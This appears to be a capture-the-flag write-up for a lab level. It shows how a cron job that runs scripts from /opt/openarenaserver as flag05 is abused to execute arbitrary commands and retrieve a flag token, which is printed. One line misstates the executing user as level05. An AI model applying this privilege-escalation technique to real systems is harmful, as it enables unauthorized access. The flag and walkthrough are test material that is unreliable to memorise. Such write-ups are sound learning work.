## Phase 1: Reconnaissance

Upon logging in, we immediately notice the following message:

```
You have new mail
```

We inspect the mail directory:

```bash
ls /var/mail
cat /var/mail/level05
```

Inside the mail, we find the following cron job:

```txt
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This tells us:
- A cron job runs **every 2 minutes**
- It executes `/usr/sbin/openarenaserver`
- It runs **as user `flag05`**


We analyze the referenced path from the cronjob:

```bash
cat /usr/sbin/openarenaserver
```

It's a shell script:

```shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

What this script does:
- It iterates over all files in `/opt/openarenaserver/`
- Each file is executed using `bash`
- Execution time is limited to 5 seconds
- After execution, the file is **deleted**

So any script placed in `/opt/openarenaserver/` will be:
1. Executed by the openarenaserver script
2. Executed **as user `level05`**
3. Automatically removed afterward

---

## Phase 3: Exploitation

First, we attempt to create a simple script:

```bash
echo "getflag" > helloworld
```

However, running this directly only executes it as `level05`, which does not give us the flag...

So we go back to the original cron job hint  
  
We can see that the **cron job** runs the script as `flag05`, not `level05`, this is perfect for us because we want privilege escalation

So instead, we create a script **inside `/opt/openarenaserver/`** and wait for the cron job to trigger.

### Proof of Concept

We create the following test file:

```bash
echo 'echo "ran from cronjob" > /tmp/yo' > /opt/openarenaserver/test
```

After waiting 2 minutes, we verify:

```bash
cat /tmp/yo
```

The file exists and contains:

```
ran from cronjob
```

This confirms that our script was executed by the cron job with `flag05` privileges.

---

## Phase 4: Getting the Flag

We repeat the same process, but this time executing `getflag`:

```bash
echo 'getflag > /tmp/output.txt' > /opt/openarenaserver/file
```

After waiting for the cron job to run, we read the output:

```bash
cat /tmp/output.txt
```

This returns:

```txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---


By abusing a cron job running as `flag05`, we were able to execute arbitrary commands by placing a script in `/opt/openarenaserver/`, ultimately calling `getflag`
